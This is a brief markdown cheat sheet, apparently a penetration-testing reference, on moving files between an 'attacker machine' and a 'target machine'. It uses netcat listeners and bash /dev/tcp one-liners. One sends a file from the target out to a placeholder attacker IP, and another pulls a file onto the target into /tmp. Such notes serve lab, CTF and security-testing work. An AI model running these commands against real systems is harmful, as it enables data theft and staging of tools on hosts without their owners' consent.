# Netcat

## Transfer files with Netcat

Attacker Machine: 

    nc -lvnp PORT > FILE

Target Machine 

    nc OUR_IP < FILE

Use bash TCP socket to transfer a file if netcat is NOT installed on the target machine

### Transfer to Attacker Machine

Attacker Machine:

    nc -lvnp PORT > file.txt

Target Machine

    bash -c 'cat /path/to/file.txt >& /dev/tcp/ATTACK_IP/PORT 0>&1'

### Transfer to Target Machine

Attacker Machine

    nc -lvnp < file.txt

Target Machine

    bash -c 'cat < /dev/tcp/ATTACK_IP/PORT > /tmp/output-file'
